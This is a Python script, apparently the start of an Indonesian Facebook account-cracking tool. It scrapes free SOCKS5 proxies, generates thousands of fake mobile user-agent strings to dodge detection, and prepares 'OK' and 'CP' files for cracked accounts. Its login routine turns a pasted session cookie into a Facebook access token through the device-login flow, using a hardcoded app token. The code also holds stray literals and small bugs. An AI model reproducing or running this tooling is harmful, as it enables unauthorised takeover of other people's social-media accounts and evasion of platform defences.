#-----------------[ IMPORT-MODULE ]-------------------
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich.panel import Panel
from rich.tree import Tree
from rich.table import Table
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
from concurrent.futures import ThreadPoolExecutor as tred
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn,TransferSpeedColumn,DownloadColumn
from rich import print as prints
from rich import pretty
from rich.text import Text as tekz
from time import time as cok
#==========Random User Ugent==========#
#user_agent=['Mozilla/5.0 (Linux; Android 8.0.0; SAMSUNG SM-A520F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/94.0.4606.41 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.0.0; SAMSUNG SM-A520F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/7.0 Chrome/94.0.4606.20 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.0.0; SAMSUNG SM-A520F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/94.0.4589.2 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.0.0; SAMSUNG SM-A520F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/7.0 Chrome/94.0.4606.50 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.0.0; SM-A520F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.992.38 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.0.0; SM-A520F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.98 Mobile Safari/537.36 OPT/2.9','Mozilla/5.0 (Linux; Android 8.0.0; SAMSUNG SM-A520F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/95.0.4636.2 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.0.0; SAMSUNG SM-A520F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/95.0.4621.0 Mobile Safari/537.36']
#"Mozilla/5.0 (Linux; Android 7.0; SM-A520F Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36 [ip:109.118.118.23]"
#"Mozilla/5.0 (Linux; Android 8.0.0; SM-A520F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.69 Mobile Safari/537.36 YaApp_Android/11.01 YaSearchBrowser/11.01"
#"Mozilla/5.0 (Linux; Android 8.0.0; SM-A520F Build/R16NW; ru-ru) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36 Puffin/9.7.2.51367AP"
#"Mozilla/5.0 (Linux; Android 8.0.0; SM-A520F Build/R16NW; ru-ru) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36 Puffin/9.6.1.51244AP"
#"Mozilla/5.0 (Linux; Android 8.0.0; SM-A520F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 Mobile Safari/537.36 YaApp_Android/10.51 YaSearchBrowser/10.51"
#"Mozilla/5.0 (Linux; Android 8.0.0; SAMSUNG SM-A520F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/96.0.4664.51 Mobile Safari/537.36"
#"Mozilla/5.0 (Linux; Android 8.0.0; SAMSUNG SM-A520F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/7.0 Chrome/96.0.4647.2 Mobile Safari/537.36"
#"Mozilla/5.0 (Linux; Android 8.0.0; SAMSUNG SM-A520F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/7.0 Chrome/97.0.4652.92 Mobile Safari/537.36"
#"Mozilla/5.0 (Linux; Android 8.0.0; SM-A520F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75"
#"Mozilla/5.0 (Linux; Android 8.0.0; SM-A520F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.105 Mobile Safari/537.36 YaApp_Android/9.65 YaSearchBrowser/9.65"
#"Mozilla/5.0 (Linux; Android 8.0.0; SAMSUNG SM-A520F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/95.0.4626.1 Mobile Safari/537.36"
#"Mozilla/5.0 (Linux; U; Android 8.0.0; de-de; SM-A520F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36 PHX/9.3"
#"Mozilla/5.0 (Linux; Android 11; Infinix X6816D Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.136 Mobile Safari/537.36"
#"Mozilla/5.0 (Linux; Android 11; Infinix X6812) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36"
#"Mozilla/5.0 (Linux; Android 11; Infinix X689B Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.132 Mobile Safari/537.36"
#"Mozilla/5.0 (Linux; Android 8.1.0; Infinix X650 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.110 Mobile Safari/537.36"
#"Mozilla/5.0 (Linux; Android 11; Infinix X697 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.101 Mobile Safari/537.36"
#"Mozilla/5.0 (Linux; Android 12; Infinix X663) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36"
#"Mozilla/5.0 (Linux; Android 11; Infinix X693 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.135 Mobile Safari/537.36"
#"Mozilla/5.0 (Linux; Android 11; Infinix X695) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.126 Mobile Safari/537.36"
#"Mozilla/5.0 (Linux; Android 10; Infinix X690 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.99 Mobile Safari/537.36"
#"Mozilla/5.0 (Linux; Android 12; Infinix X672 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.132 Mobile Safari/537.36"
#"Mozilla/5.0 (Linux; Android 12; Infinix X676C Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/99.0.4844.88 Mobile Safari/537.36"
#"Mozilla/5.0 (Linux; Android 12; Infinix X670 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.136 Mobile Safari/537.36"
#"Mozilla/5.0 (Linux; Android 11; Infinix X6815) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36"
#"Mozilla/5.0 (Linux; Android 10; Infinix X687 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.135 Mobile Safari/537.36"
#"Mozilla/5.0 (Linux; Android 12; Infinix X6821 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36"
#"Mozilla/5.0 (Linux; Android 7.0; Infinix HOT 4 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36"
#"Mozilla/5.0 (Linux; Android 10; Infinix X680B Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.5005.78 Mobile Safari/537.36"
#"Mozilla/5.0 (Linux; Android 11; Infinix X6815) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36"
#"Mozilla/5.0 (Linux; Android 11; Infinix X6810 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.117 Mobile Safari/537.36"
#"Mozilla/5.0 (Linux; Android 11; Infinix X6811 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.210 Mobile Safari/537.36"
#"Mozilla/5.0 (Linux; Android 5.1; Infinix-X600-LTE Build/LMY47D) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/39.0.0.0 Mobile Safari/537.36"
#"Mozilla/5.0 (Linux; Android 5.1; Infinix NOTE 2 LTE Build/LMY47D) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/39.0.0.0 Mobile Safari/537.36"
#"Mozilla/5.0 (Linux; Android 11; Infinix X689C Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.136 Mobile Safari/537.36"
#"Mozilla/5.0 (Linux; Android 12; Infinix X677 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/99.0.4844.88 Mobile Safari/537.36"
#"Mozilla/5.0 (Linux; Android 12; Infinix X671B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.136 Mobile Safari/537.36"
#"Mozilla/5.0 (Linux; Android 12; Infinix X6820 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.135 Mobile Safari/537.36"
#"Mozilla/5.0 (Linux; Android 8.1.0; Infinix X620) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36"
#"Mozilla/5.0 (Linux; Android 8.1.0; Infinix X620B Build/OPM1.171019.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.132 Mobile Safari/537.36"
#"Mozilla/5.0 (Linux; Android 12; Infinix X676B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.136 Mobile Safari/537.36"
#"Mozilla/5.0 (Linux; Android 10; Infinix X657B Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.99 Mobile Safari/537.36"
#"Mozilla/5.0 (Linux; arm; Android 12; Infinix X6823C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 YaSearchBrowser/23.33.1 BroPP/1.0 YaSearchApp/23.33.1 webOmni SA/3 Mobile Safari/537.36"
#"Mozilla/5.0 (Linux; Android 12; Infinix X6515 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.76 Mobile Safari/537.36"
"Mozilla/5.0 (Linux; Android 9; Redmi 6A Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.99 Mobile Safari/537.36"
"Mozilla/5.0 (Linux; Android 10; Redmi Note 7 Build/QKQ1.190910.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.135 Mobile Safari/537.36"
"Mozilla/5.0 (Linux; Android 12; Redmi 6A) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/77 Mobile Safari/537.36 Brave/92"
"Mozilla/5.0 (Linux; Android 9; Redmi 6A Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/80.0.3987.99 Mobile Safari/537.36 "
"Mozilla/5.0 (Linux; Android 9; Redmi 6A Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/80.0.3987.99 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/384.0.0.25 .111;]"
uas_random = (["Mozilla/5.0 (Linux; Android 8.0.0; SM-A520F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.66 Mobile Safari/537.36 YaApp_Android/10.41 YaSearchBrowser/10.41","Mozilla/5.0 (Linux; Android 8.0.0; SM-A520F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.82 Mobile Safari/537.36 YaApp_Android/11.10 YaSearchBrowser/11.10","Mozilla/5.0 (Linux; Android 7.0; SM-A520F Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 YaApp_Android/10.44 YaSearchBrowser/10.44","Mozilla/5.0 (Linux; Android 7.0; SM-A520F Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.93 Mobile Safari/537.36 YaApp_Android/9.80 YaSearchBrowser/9.80","Mozilla/5.0 (Linux; Android 8.0.0; SM-A520F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36 YaApp_Android/10.30 YaSearchBrowser/10.30","Mozilla/5.0 (Linux; Android 8.0.0; SM-A520F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.210 Mobile Safari/537.36 YaApp_Android/9.50 YaSearchBrowser/9.50"])
"Mozilla/5.0 (Linux; U; Android 7.0; nl-be; SM-A520F Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.132 Mobile Safari/537.36 PHX/9.3"
"Mozilla/5.0 (Linux; Android 8.0.0; SAMSUNG SM-A520F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/96.0.4640.2 Mobile Safari/537.36"
"Mozilla/5.0 (Linux; Android 8.0.0; SAMSUNG SM-A520F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/97.0.4669.77 Mobile Safari/537.36"
uas_random2 = (["Mozilla/5.0 (Linux; Android 8.0.0; SM-A520F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36 YaApp_Android/10.70 YaSearchBrowser/10.70","Mozilla/5.0 (Linux; Android 8.0.0; SM-A520F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.66 Mobile Safari/537.36 OPT/2.9","Mozilla/5.0 (Linux; Android 8.0.0; SM-A520F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36 YaApp_Android/10.44 YaSearchBrowser/10.44"])
#------------------[ USER-AGENT ]-------------------#
pretty.install()
CON=sol()
ugen=[]
ugen2=[]
proxxy=[]
dump=[]
cokbrut=[]
ngentott = []
ses=requests.Session()
princp=[]
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
    exit(e)

###----------[ USER AGENT 4 ]----------###
for agenku in range(10000):
	aa='Mozilla/5.0 (Linux; Android 8.1.0; '
	b=random.choice(['6','7','8','9','10','11','12'])
	c='Infinix X650 Build/O11019; wv) '
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/108.0.5359.128 '
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/393.0.0.35 .106;]'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	
	aa='Mozilla/5.0 (iPhone;'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='CPU iPhone OS 16_4 like Mac OS X) '
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/70.0.3538.60 '
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile/15E148 Safari/605.1'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android 12; '
	b=random.choice(['6','7','8','9','10','11','12'])
	c='moto g stylus 5G (2022) Build/S2SDS32.21-85-3-2-1-1; wv) '
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.24 '
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36 '
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	ugen.append(uaku2)
	
	
	aa='Mozilla/5.0 (Linux; Android 12; '
	b=random.choice(['6','7','8','9','10','11','12'])
	c='moto g stylus 5G (2022) Build/S2SDS32.21-85-3-2-1-1; wv) '
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36 '
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	ugen2.append(uaku2)
	
	a='Mozilla/5.0 (Macintosh;'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Intel Mac OS X 10_13_6)'
	e=random.randrange(100, 9999)
	f='AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Safari/605.1.15'
	uakuh=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen2.append(uakuh)
	
for x in range(10):
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(100, 9999)
	c=random.randrange(100, 9999)
	d='V2111'
	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	h=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	i=random.randrange(1, 9)
	j='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	k=random.randrange(1, 9)
	l=random.randrange(1, 9)
	m='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/401.0.0.24.77;]'
	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
def uaku():
	try:
		ua=open('ua2.txt','r').read().splitlines()
		for ub in ua : 
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/SYAHX FORCE/SYAH/blob/main/ua2.txt').text
		ua=open('.ua2.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.ua2.txt','r').read().splitlines()
ua = random.choice(['Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.87 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; RMX2061 Build/RKQ1.201112.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.85 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; vivo 1907 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.135 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36']);
#------------[ INDICATION ]---------------#
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
uadia, uadarimu = [],[]
pwpluss,pwnya=[],[]
#------------[ WARNA-COLOR ]--------------#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
puti = '\033[1;37m'
asu = random.choice([m,k,h,u,b])
###----------[ WARNA PRINT RICH ]---------- ###
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
P2 = "[#FFFFFF]" # PUTIH

###----------[ CEK WARNA TEMA ]---------- ###
try:
	file_color = open("data/theme_color","r").read()
	color_text = file_color.split("p")[0]
	color_panel = file_color.split("hh")[1]
except:
	color_text = "[#00C8FF]"
	color_panel = "#00FF00"
#--------------------[ CONVERTER-BULAN ]--------------#
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'

###----------[ GET TIME ]---------- ###
def waktu():
	now = datetime.now()
	hours = now.hour
	if 4 <= hours < 12:timenow = "good morning"
	elif 12 <= hours < 15:timenow = "good afternoon"
	elif 15 <= hours < 18:timenow = "good evening"
	else:timenow = "good night"
	return timenow
#------------------[ MACHINE-SUPPORT ]---------------#
def dhanz(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.004)
def clear():
	os.system('clear')
def back():
	login()
#------------------[ LOGO-LAKNAT ]-----------------#
###----------[ BANNER MENUH ]----------###
def banner():
	os.system('clear')
	print(f'''{asu}
{hh} 
__   _      ___         __    _ ___   ___ __ __ 
)_) /_) )_) )_  )\/)    )_)  / )  (   )_   /  / 
/ \ / / ( ( (__ (  (    /__) (_/ \__) (__  /_ /_ 
''')
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
		except KeyError:
			login_lagi334()
		except requests.exceptions.ConnectionError:
			li = '# INTERNET BERMASALAH'
			lo = mark(li, style='red')
			sol().print(lo, style='cyan')
			exit()
	except IOError:
		login_lagi334()
def login_lagi334():
	try:
		os.system('clear')
		banner()
		print('')
		your_cookies = input(' Masukan Cookie : ')
		with requests.Session() as r:
			try:
				r.headers.update({'content-type': 'application/x-www-form-urlencoded',})
				data = {'access_token': '867777633323150|446fdcd4a3704f64e5f6e5fd12d35d01','scope': ''}
				response = json.loads(r.post('https://graph.facebook.com/v2.6/device/login/', data = data).text)
				code, user_code = response['code'], response['user_code']
				verification_url, status_url = ('https://m.facebook.com/device?user_code={}'.format(user_code)), ('https://graph.facebook.com/v2.6/device/login_status?method=post&code={}&access_token=867777633323150|446fdcd4a3704f64e5f6e5fd12d35d01&callback=LeetsharesCallback'.format(code))
				r.headers.pop('content-type')
				r.headers.update({'sec-fetch-mode': 'navigate','user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36','sec-fetch-site': 'cross-site','Host': 'm.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-dest': 'document',})
				response2 = r.get(verification_url, cookies = {'cookie': your_cookies}).text
				if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
					print("😿  Cookie Invalid...", end='\r');time.sleep(3.5);print("                     ", end='\r');exit()
				else:
					action = re.search('action="(.*?)">', str(response2)).group(1).replace('amp;', '')
					fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response2)).group(1)
					jazoest = re.search('name="jazoest" value="(\d+)"', str(response2)).group(1)
					data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'qr': 0,'user_code': user_code,}
					r.headers.update({'origin': 'https://m.facebook.com','referer': verification_url,'content-type': 'application/x-www-form-urlencoded','sec-fetch-site': 'same-origin',})
					response3 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies})
					if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
						r.headers.pop('content-type');r.headers.pop('origin')
						response4 = r.post(response3.url, data = data, cookies = {'cookie': your_cookies}).text
						action = re.search('action="(.*?)"', str(response4)).group(1).replace('amp;', '')
						fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response4)).group(1)
						jazoest = re.search('name="jazoest" value="(\d+)"', str(response4)).group(1)
						scope = re.search('name="scope" value="(.*?)"', str(response4)).group(1)
						display = re.search('name="display" value="(.*?)"', str(response4)).group(1)
						user_code = re.search('name="user_code" value="(.*?)"', str(response4)).group(1)
						logger_id = re.search('name="logger_id" value="(.*?)"', str(response4)).group(1)
						auth_type = re.search('name="auth_type" value="(.*?)"', str(response4)).group(1)
						encrypted_post_body = re.search('name="encrypted_post_body" value="(.*?)"', str(response4)).group(1)
						return_format = re.search('name="return_format\\[\\]" value="(.*?)"', str(response4)).group(1)
						r.headers.update({'origin': 'https://m.facebook.com','referer': response3.url,'content-type': 'application/x-www-form-urlencoded',})
						data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'scope': scope,'display': display,'user_code': user_code,'logger_id': logger_id,'auth_type': auth_type,'encrypted_post_body': encrypted_post_body,'return_format[]': return_format,}
						response5 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies}).text
